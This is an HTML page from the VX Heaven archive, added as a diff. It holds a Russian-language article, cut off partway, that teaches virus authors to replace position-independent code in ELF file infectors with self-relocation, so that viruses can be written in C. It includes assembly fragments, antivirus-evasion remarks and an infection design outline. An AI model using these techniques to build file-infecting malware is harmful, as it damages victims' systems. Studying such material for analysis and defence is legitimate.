@@ -1,0 +1,468 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> herm1t 'From position-independent to self-relocatable viral code' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="herm1t"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, herm1t,From position-independent to self-relocatable viral code, virus, data, text, uint, переменной, start, frag, адрес, можно, адресом, вирус, кода, релок, rtld, дельта"/>
+<meta name="Description" content="В статье рассмотрены различные способы организации позиционно-независимого и перемещаемого кода. Показано, что отказ от PIC позволяет существенно ослабить ограничения на код вируса, и использовать те преимущества высокоуровнего программирования, которые ранее были практически недоступны авторам вирусов."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"a5e40cbb2d46cba59cfed40005c6d3531120d03a-1498757816-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhe07.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>From position-independent to self-relocatable viral code</h1><p><a href="/lib/?lang=ru&amp;author=herm1t"> herm1t</a><br/> <em>Декабрь 2009</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhe07.html';</script><div class="ci"><a href="/lib/?ci=vhe07">1</a></div>[<a style="" href="/lib/?lang=RU&amp;index=UN#vhe07">Вернуться к списку</a>] [<a href="/lib/vhe07.html#disqus_thread">Комментарии</a>]<br/> 
+<address>
+herm1t &lt;<a href="/cdn-cgi/l/email-protection#127a77607f236652646a3c7c77667e676a3c7d6075"><span class="__cf_email__" data-cfemail="d2bab7a0bfe3a692a4aafcbcb7a6bea7aafcbda0b5">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>&gt;<br/>
+<a href="http://vx.netlux.org/herm1t/">http://vx.netlux.org/herm1t/</a>
+</address>
+<ul>
+<li><a href="#c0">Введение</a></li>
+<li><a href="#c1">Дельты и базовые адреса</a></li>
+<li><a href="#c2">Relocation</a></li>
+<li><a href="#c3">Реализация</a>
+<ul>
+<li><a href="#c31">LD</a></li>
+</ul></li>
+<li><a href="#c4">Перемещаемый код без релоков</a></li>
+<li><a href="#c5">Обработка ошибок</a></li>
+<li><a href="#c6">Заключение</a></li>
+<li><a href="#c7">Код и примеры</a>
+<ul>
+<li><a href="#c71">Как работать с примерами?</a></li>
+</ul></li>
+</ul>
+<div style="float: right; width: 30em; text-align: justify;">
+... Теперь вирус должен уметь запускаться по виртуальному адресу, зависящему от длины зараженной программы, а это означает, что вирус должен быть написан в позиционно-независимом коде, используя относительные, а не абсолютные адреса. Для опытного программиста это не сложно.
+<p><em>Эндрю Таненбаум "<a href="/lib/aat01.html">Современные операционные системы</a>"</em></p>
+</div><br clear="all"/>
+<div style="float: right; width: 30em; text-align: justify;">
+Музыкант никому ничего не должен
+<p><em>Умка</em></p>
+</div><br clear="all"/>
+<h2><a name="c0"></a>Введение</h2>
+<p>В статье рассмотрены различные способы организации позиционно-независимого и перемещаемого кода. Показано, что отказ от PIC позволяет существенно ослабить ограничения на код вируса, и использовать те преимущества высокоуровнего программирования, которые ранее были практически недоступны авторам вирусов.</p>
+<h2><a name="c1"></a>Дельты и базовые адреса</h2>
+<p>Писать ещё раз о дельта-смещении, всё равно что посылать в журнал "Радио" статью "Еще раз к вопросу о конструкции блока питания", но нужно же с чего-то начинать, поэтому - ещё раз к вопросу о дельта-смещении в вирусах.</p>
+<pre>
+Нулевое поколение вируса   Зараженная программа
+8048100 |          |       |          | 8048100
+        | virus:   |       |программа |   &uarr;
+        |          |       |          |   дельта- 
+        |          |       |...       |   смещение = 0x8048200 - 0x7948100 = 0x100
+        |          |       +----------+   &darr;
+8048200 | variable |       | virus:   | 8048200 
+8048204 | _end     |       |          |
+                           |          |
+Обращение к переменной     | variable | 8048300	Вирус добавляет к адресам
+в обычной программе        | _end:    | 8048304	своих переменных дельту:
+выглядит вот так:				mov edx, [ebp + variable]
+B8 00 82 04 08 mov eax, [variable]		89 95 00 82 04 80
+</pre>
+<p>Если написать вирус, как обычную программу, то после заражения, вирус работать перестанет, так как в зараженной программе переменной по адресу 0x8048200 нет. Классическое решение состоит в вычислении <em>дельта-смещения</em>, разности между новым адресом вируса (в жертве) и старым адресом (в программе-носителе):</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_virus<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #339933;">.</span>L0<br/>
+<span style="color: #339933;">.</span>L0<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: #339933;">.</span>L0<br/>
+<span style="color: black; font-style: italic;">; в ebp теперь разница между адресом метки .L0 (после компиляции) и реальным</span><br/>
+<span style="color: black; font-style: italic;">; её адресом в памяти</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span> <span style="color: #339933;">+</span> var<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+<span style="color: black; font-style: italic;">; добавим к адресу переменной времени компиляции дельту и получим</span><br/>
+<span style="color: black; font-style: italic;">; правильный адрес переменной в зараженном процессе</span><br/>
+<span style="color: black; font-style: italic;">; 804888c: 8b 85 88 84 04 08</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;0x8048488(%ebp),%eax</span><br/>
+&nbsp;<br/>
+&nbsp;</div>
+<p>Казалось бы всё хорошо, вирус работает... Посмотрим теперь в код. Возьмём вирус Win32.Cyanide (by berniee), код выглядит прямо скажем не очень:</p>
+<pre class="source">
+  40134a:       03 95 6a 10 40 00       add    0x40106a(%ebp),%edx
+  401350:       89 95 72 10 40 00       mov    %edx,0x401072(%ebp)
+  401356:       8b 50 20                mov    0x20(%eax),%edx
+  401359:       03 95 6a 10 40 00       add    0x40106a(%ebp),%edx
+  40135f:       89 95 7a 10 40 00       mov    %edx,0x40107a(%ebp)        
+</pre>
+<p>Зачем нам таскать за собой эти длинные константы?</p>
+<p>А что если использовать смещения переменных от начала вируса?</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_virus<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #339933;">.</span>L0<br/>
+<span style="color: #339933;">.</span>L0<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #339933;">.</span>L0 <span style="color: #339933;">-</span> _virus<span style="color: black;">&#41;</span><br/>
+<span style="color: black; font-style: italic;">; в ebp - &lt;em&gt;базовый адрес вируса&lt;/em&gt;, он никак не учитывает то, какой именно</span><br/>
+<span style="color: black; font-style: italic;">; адрес был у вируса после компиляции</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; (var - _virus) - это &lt;em&gt;относительный&lt;/em&gt; адрес переменной от начала вируса</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span> <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>var <span style="color: #339933;">-</span> _virus<span style="color: black;">&#41;</span><span style="color: black;">&#93;</span><br/>
+<span style="color: black; font-style: italic;">; 804888c: 8b 85 f1 03 00 00</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp; 0x3f1(%ebp),%eax</span><br/>
+&nbsp;</div>
+<p>Что в лоб, что по лбу - шесть байт, только значения поменялись. Однако, в качестве "точки отсчёта" можно взять любое значение. Например адрес области данных вируса:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_virus<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; <span style="color: #339933;">.</span>L0<br/>
+<span style="color: #339933;">.</span>L0<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: black;">&#40;</span><span style="color: #339933;">.</span>L0 <span style="color: #339933;">-</span> _virus<span style="color: black;">&#41;</span> <span style="color: #339933;">-</span> <span style="color: black;">&#40;</span>virus_data <span style="color: #339933;">-</span> _virus<span style="color: black;">&#41;</span><br/>
+<span style="color: black; font-style: italic;">; в ebp - адрес &quot;virus_data&quot; в текущем процессе, который никак не зависит</span><br/>
+<span style="color: black; font-style: italic;">; от того, каким этот адрес был в нулевом поколении вируса</span><br/>
+<br/>
+<span style="color: black; font-style: italic;">; (var - virus_data) - это &lt;em&gt;относительный&lt;/em&gt; адрес переменной &quot;var&quot;</span><br/>
+<span style="color: black; font-style: italic;">; от начала области данных (virus_data)</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span> <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>var <span style="color: #339933;">-</span> virus_data<span style="color: black;">&#41;</span><span style="color: black;">&#93;</span><br/>
+&lt;strong&gt;<span style="color: black; font-style: italic;">; 8048889: 8b 45 00</span><br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; mov &nbsp; &nbsp;0x0(%ebp),%eax&lt;/strong&gt;</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; virus_data<span style="color: #339933;">:</span><br/>
+var &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0x55aa55aa</span><br/>
+&nbsp;</div>
+<p>Для того, чтобы получить адреса в <em>коде</em> используем отрицательные смещения, например, адрес начала вируса - это <tt>ebp - (virus_data - _virus)</tt>. Часто используемые переменные можно поместить в начало области данных, что даст определённую экономию.</p>
+<p>Этот же способ используется в позиционно-независимом коде генерируемом компилятором. Все используемые адреса - относительные от _GLOBAL_OFFSET_TABLE_. При этом ссылки на GOT (и ниже - .rodata, .text...) имеют отрицательные смещения, выше (.got.plt, .data ...) - положительные.</p>
+<p>Теперь немного об инструкции call, присутствующей в каждом примере. Этот код использовался и используется настолько часто, что эвристик одного из особо тупых антивирусов, когда-то срабатывал на последовательность CALL / POP / SUB. А между тем уже пятнадцать лет назад TLN предложил (<cite>"The Smallest Virus I Could Manage", vlad #3</cite>) просто <em>вставлять</em> дельту в копию вируса на этапе заражения. Попробуем. Только не дельту, а адрес данных вируса:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">_virus<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ebp</span><span style="color: #339933;">,</span> <span style="color: #0000ff; font-weight: bold;">strict</span> <span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: #ff0000;">0</span><br/>
+<span style="color: black; font-style: italic;">; fix_vd - это смещение от начала вируса, слова, которое нужно пропатчить</span><br/>
+<span style="color: black; font-style: italic;">; адресом virus_data (адрес вируса в жертве + (virus_data - _virus))</span><br/>
+fix_vd&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">4</span> <span style="color: #339933;">-</span> _virus<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">ebp</span> <span style="color: #339933;">+</span> <span style="color: black;">&#40;</span>var <span style="color: #339933;">-</span> virus_data<span style="color: black;">&#41;</span><span style="color: black;">&#93;</span><br/>
+&nbsp;</div>
+<p>По сути, virus_data - это просто <em>переменная</em>, а что это значит?
+Это значит, что можно исправлять непосредственно абсолютные адреса переменных:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; esi - мог бы быть началом вируса в отображенной в память жертве</span><br/>
+<span style="color: black; font-style: italic;">; edi - дельта</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> fix_var<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>var<span style="color: black;">&#93;</span><br/>
+fix_var &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">4</span> <span style="color: #339933;">-</span> _virus<br/>
+&nbsp;</div>
+<p>Теперь уже нету ни подозрительной инструкции "call", ни дельт в их обычном виде, ни красивых относительных адресов. А теперь делаем ещё один шаг вперёд. Нельзя ли поступить так со <em>всеми</em> переменными? В результате мы получим не позиционно-независимый, а <em>перемещаемый</em> (relocatable) код. Такой же, как и в "обычных" программах.</p>
+<h2><a name="c2"></a>Relocation</h2>
+<p>В последнем примере из предыдущей главы показано, как можно в процессе заражения исправлять адреса переменных, но в примере только одна переменная, а в вирусе их много. Как быть? Не писать же по нескольку инструкций, на каждую переменную? А как устроены "обычные" программы? А вот как: все адреса, которые необходимо исправить, если программа будет загружена по другому адресу сведены в таблицу. Эта таблица называется <em>таблицей перемещений</em> (relocation table). Грубо говоря, в таблице содержатся смещения слов в программе, которые необходимо исправить. Где-то так:</p>
+<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">; esi - мог бы быть началом вируса, внутри отображения жертвы в памяти</span><br/>
+<span style="color: black; font-style: italic;">; edi - дельтой</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; relocate<span style="color: #339933;">:</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #0000ff; font-weight: bold;">rel</span> <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">ecx</span> <span style="color: #339933;">*</span> <span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><br/>
+<span style="color: black; font-style: italic;">; NB! в настоящем вирусе, тут тоже наличествовал бы релок</span><br/>
+<span style="color: black; font-style: italic;">; fix_rel equ $ - 4 - _virus</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">esi</span> <span style="color: #339933;">+</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">edi</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ecx</span><span style="color: #339933;">,</span> rel_count<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jb</span>&nbsp; &nbsp; &nbsp; relocate<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #339933;">...</span><br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span>var<span style="color: black;">&#93;</span><br/>
+fix_var &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> <span style="color: #ff0000;">4</span> <span style="color: #339933;">-</span> _virus<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">3</span><br/>
+var &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">0x55aa55aa</span><br/>
+<span style="color: black; font-style: italic;">; таблица перемещений</span><br/>
+<span style="color: #0000ff; font-weight: bold;">rel</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; fix_var<br/>
+<span style="color: black; font-style: italic;">; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; dd&nbsp; &nbsp; &nbsp; fix_rel</span><br/>
+rel_count &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">equ</span> &nbsp; &nbsp; <span style="color: black;">&#40;</span><span style="color: #0000ff; font-weight: bold;">$</span> <span style="color: #339933;">-</span> <span style="color: #0000ff; font-weight: bold;">rel</span><span style="color: black;">&#41;</span> <span style="color: #339933;">/</span> <span style="color: #ff0000;">4</span><br/>
+&nbsp;</div>
+<p>Как ты наверное понимаешь, у меня и мысли не возникало писать код таким образом. Таблица перемещений создается компилятором и присутствует только в объектных файлах. Чтобы таблица появилась в исполняемом файле необходимо указать компоновщику ключ "--emit-relocs". После чего можно дизассемблировать бинарь и посмотреть, что получилось:</p>
+<pre>
+8048480:       a1 87 84 04 08          mov    0x8048487,%eax
+<strong>                       8048481: R_386_32       .text</strong>
+</pre>
+<p>Вот оно. Или так:</p>
+<pre>
+$ objdump -r ./a.out
+...
+RELOCATION RECORDS FOR [.text]:
+OFFSET   TYPE              VALUE 
+...
+00000401 R_386_32          .text
+</pre>
+<p>Но и это ещё не всё. Наличие или отсутствие инструкции CALL, а также длина MOV-ов, загружающих значения переменных меня тоже не волнуют. На самом деле, <strong>избавившись от позиционно-независимого кода, мы избавляемся от самого жесткого ограничения на стиль кода вируса</strong>. <em>Это значит, что теперь можно не напрягаясь писать вирус на любом языке, не прибегая к ассемблеру и всевозможным ухищрениям.</em> Си со всеми фичами, такими как коллбеки, глобальные переменные, строки, библиотечные функции к вашим услугам. Теперь можно не тратить время на асмодрочерство или попытки <del>беспощадно выебать</del> тонко настроить компилятор, а заниматься <del>ксором двордов в уме</del> "вирусными технологиями", <del>о которых мы любим попиздеть ртом</del>, которые мы разработали, и которыми по праву гордимся.</p>
+<h2><a name="c3"></a>Реализация</h2>
+<p>От теории к практике. Наиболее очевидный способ реализации - написать вирус, скомпилировать в объектный файл (с релоками), а затем при помощи специально написанной программы выдрать из объектика код, данные и таблицу перемещений вируса и заразить ими жертву. Раз уж всё равно придётся писать дроппер, то почему бы сразу не написать <em>компоновщик</em>?</p>
+<p>Разберёмся для начала с форматом релоков.</p>
+<p>В ELF файле таблица релоков для секции .text находится в секции .rel.text и содержит массив структур Elf32_Rel, которая состоит из смещения, типа и ссылки на таблицу символов (.dynsym), которая в свою очередь является массивом структур Elf32_Sym, в которой до чёртиков полей, в том числе значение символа, номер секции, смещение в таблице строк (.dynstr) на имя символа... Хватит? Мне тоже захотелось реализовать это как-нибудь попроще.</p>
+<p>Вирус состоит из "фрагмента" (чтобы не путать с секциями и сегментами определёнными в ELF файле) кода и данных. С фрагментом кода всё ясно, а во фрагменте данных помимо собственно инициализированных переменных будут находится неинициализированные переменные (в обычных программах они "живут" в .bss), строки (в обычных программах - в .rodata), таблица перемещений и таблица строк с именами внешних функций.</p>
+<p>Вирус состоит из процедур поиска жертв и заражения, а так же компоновщика времени исполнения (RTLD) и процедуры настройки на новые адреса relocate():</p>
+<pre>
+"фрагмент" кода
++- stub.o --------------+
+| _start:		| __code_start
+|	pusha		|
+|	call	rtld	|
+|	popa		|
+|	jmp	__entry |
++- rtld.o --------------+
+| findlibc, rtld,       |
+| relocate              |
++- virus.o -------------+
+| main() ...            | __code_end
++-----------------------+
+"фрагмент" данных
++-----------------------+
+| relocation table      | __data_start
+| ... virus data ...    |
+| string table          | __data_end
++-----------------------+
+</pre>
+<p>__* - это специальные символы, вычисляемые компоновщиком, в исходном коде они объявлены, как extern.</p>
+<p>После запуска:</p>
+<ul>
+<li>Управление получает rtld(), который
+<ul>
+<li>Находит в памяти стандартную библиотеку libc (подробнее на эту тему в <cite>"<a href="/lib/vhe05.html">INT 0x80? No, thank you!</a>", EOF#2</cite>)</li>
+<li>Находит (resolve()) адрес функции mprotect(2)</li>
+<li>Меняет права фрагмента кода в памяти на R/W</li>
+<li>Выбирает из таблицы перемещений те элементы, которые описывают внешние функции</li>
+<li>Находит адреса внешних функций и вставляет их в код вируса</li>
+<li>Востанавливает права фрагмента в RO</li>
+<li>Вызывает main()
+<ul>
+<li>который при помощи функции ftw(3) ищет файлы и пытается из заразить
+<ul>
+<li>infect() проверяет тип найденного файла, и если всё подходит пытается вставить в файл код и данные вируса. Чтобы вирус мог работать в зараженном файле, необходимо исправить адреса в коде и данных (в копии вируса), для чего вызывается функция relocate()
+<ul>
+<li>Выбирает из таблицы релоков те элементы, которые <em>не относятся</em> к вызовам внешних функций и исправляет их</li>
+</ul></li>
+</ul></li>
+</ul></li>
+</ul></li>
+<li>Управление получает оригинальный код</li>
+</ul>
+<p>В этой статье делается упор на исправление адресов кода и данных вируса. Импорты - совсем другая история, существует возможность добавлять "статические" импорты, перепоручив резольвинг системному RTLD, не таская за собой громоздкий код резольвера: нужно пропатчить немного .dynsym, .dynstr, приделать, где-нибудь "сбоку" вирусные PLT и GOT, но импорты связаны с релоками лишь отчасти, так что о них в другой раз.</p>
+<p>Таблица релоков состоит из 32-битных значений, заканчивающаяся на 0xffffffff, где:</p>
+<table border="1">
+<tr><th>Биты</th><th>Название</th><th>Описание</th></tr>
+<tr><td>31</td><td>SRC_FRAG</td><td>релок находится в (0 секции кода, 1 - данных)</td></tr>
